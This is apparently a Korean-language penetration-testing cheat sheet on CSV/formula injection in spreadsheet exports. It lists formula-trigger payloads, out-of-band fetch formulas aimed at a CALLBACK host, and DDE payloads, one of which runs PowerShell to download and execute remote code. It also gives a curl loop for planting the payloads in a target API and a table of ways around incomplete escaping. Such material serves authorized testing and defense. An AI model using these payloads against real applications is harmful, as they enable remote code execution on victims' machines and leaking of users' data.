### 기본 페이로드

#### 수식 시작 문자 (개별 검증)

| 페이로드 | Excel 효과 | 비고 |
|---|---|---|
| `=1+1` | 결과 `2` | 기본 수식 |
| `+1+1` | 결과 `2` | `+` 시작 |
| `-2+3` | 결과 `1` | 음수 시작 |
| `@SUM(1+1)` | 결과 `2` | Lotus 호환 `@` |
| `\t=1+1` (TAB) | trim 후 수식 평가 | 일부 환경 |
| `\r=1+1` (CR) | trim 후 수식 평가 | 일부 환경 |
| `0e1+1` | 과학 표기 후 수식 | drop-down 회피 |

#### OOB 페이로드 (Excel/Sheets에서 외부 fetch)
- `=HYPERLINK("https://CALLBACK.oast.fun/csv","click")` (Excel/Sheets)
- `=IMPORTXML("https://CALLBACK/csv-import","//x")` (Google Sheets)
- `=IMPORTDATA("https://CALLBACK/csv-data")` (Google Sheets)
- `=IMPORTHTML("https://CALLBACK/csv-html","table",1)` (Google Sheets)
- `=IMAGE("https://CALLBACK/img")` (Google Sheets — 자동 fetch, 무경고)
- `=WEBSERVICE("https://CALLBACK/ws")` (Excel Online)

#### DDE/RCE (구버전 Excel)
- `=cmd|'/C calc'!A1`
- `=cmd|'/C powershell IEX(New-Object Net.WebClient).downloadString("https://CALLBACK/x")'!A1`
- `=DDE("cmd";"/C calc";"!A1")` (LibreOffice)

#### Power Query (Excel 2016+ M language)
- `=Web.Contents("https://CALLBACK/m")` (Power Query)

#### Cell reference enumeration
- `=A1` (셀 참조 — 이메일/필터로 다른 사용자 데이터 fetch 가능)
- `=Sheet2!A1`

#### 검증 흐름
```bash
# 1. 페이로드 저장 (각 문자별 개별)
for p in "=1+1" "+cmd" "-2+3" "@SUM(1)" $'\t=1+1' '=HYPERLINK("https://CALLBACK/csv","x")'; do
  curl -X POST "https://target/api/contacts" -H "Cookie: session=..." \
    -H "Content-Type: application/json" -d "{\"name\":\"$p\"}"
done

# 2. CSV/XLSX export
curl -o export.csv "https://target/api/contacts/export?format=csv" -H "Cookie: session=..."

# 3. 각 셀별 이스케이프 적용 여부 개별 확인
cat export.csv

# 4. OOB 콜백 모니터링 (실제 Excel/Sheets에서 열어야 트리거)
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| `=` 시작만 차단 | `+1+1`, `-2+3`, `@SUM(1)`, `\t=1+1`, `\r=1+1` |
| 첫 문자 검증 후 이스케이프 | 공백/BOM/zero-width space 시작 (`\u200B=1+1`, `\xef\xbb\xbf=1+1`) — 검증은 통과, Excel은 trim 후 평가 |
| Quote escape (`"` → `""`) | 수식 escape와 다른 개념 — `=1+1`은 따옴표 미관여 |
| 숫자 타입 강제 (Apache POI `setCellType(NUMERIC)`) | 사용자 입력이 텍스트 필드면 효과 없음 |
| 셀 단위 이스케이프 | sharedStrings.xml의 `<t>` 요소 직접 조작 (XLSX 내부) |
| `=`만 prefix 추가 (`'=`) | `+`/`-`/`@` 미적용 |
| 함수명 블랙리스트 (`HYPERLINK`) | `=HYPER`+`LINK(...)` (CSV에선 한 셀이라 분할 안 됨) — 다른 함수 사용 (`IMAGE`, `IMPORTXML`) |
| Excel 보안 모드 | macro/DDE 차단되어도 `=HYPERLINK` 같은 내장 함수는 동작 |

#### 다중 인코딩
```
# UTF-8 BOM (자동 trim 후 수식 평가)
\xef\xbb\xbf=HYPERLINK("https://CALLBACK","x")

# 다른 BOM (UTF-16 LE)
\xff\xfe=...
```

---

### 참고사항

- 사용자 입력 필드(이름/이메일/메모/주소/리뷰)가 관리자 dashboard에서 export되는 경로 빈출
- 백엔드 API proxy 패턴(앱이 백엔드 응답을 `Content-Type: text/csv`로 통과)도 동일 영향 — 백엔드 코드 미확인 시 동적 테스트 필수
- Google Sheets는 `IMPORTXML`/`IMPORTDATA`/`IMAGE`로 무경고 외부 fetch — 데이터 누설 채널
- DDE는 패치된 Excel(2018+)에서 사용자 경고 — 미패치 환경 즉시 RCE
- LibreOffice도 `=DDE` 매크로 동일 위험
- XLSX `xl/sharedStrings.xml` 내부 `<t>` 요소가 웹뷰에 렌더링되면 XSS 변형
- 메일 첨부 CSV가 자동 발송되어 수신자가 의심 없이 여는 경우 영향도 격상
- 모든 수식 문자(`=`, `+`, `-`, `@`, `\t`, `\r`) 개별 검증 필수 — 부분 이스케이프가 흔함
- 셀 참조 (`=A1`)는 동일 시트 내 다른 사용자 데이터 fetch 가능 — multi-user export 환경
- OOB 검증은 외부 콜백 인프라 + 실제 Excel/Sheets에서 파일 열기 필요 — 자동화 어려움
- 피해자가 다운로드한 CSV를 Excel로 열어야 트리거 — 공격 표면은 사용자 행동 의존
- `'=1+1` 같은 작은따옴표 prefix는 Excel 표시는 `=1+1`이지만 평가 안 됨 — 안전
- `'` 외 `\t`/`"=...` 같은 다른 prefix도 Excel은 다르게 처리 — 라이브러리별 확인
- Power Query는 Excel 2016+ — 더 강력한 fetch 함수 (`Web.Contents`)
- IMAGE 함수는 Google Sheets만 — 셀에 이미지 삽입하며 자동 fetch (피해자 IP 누출)
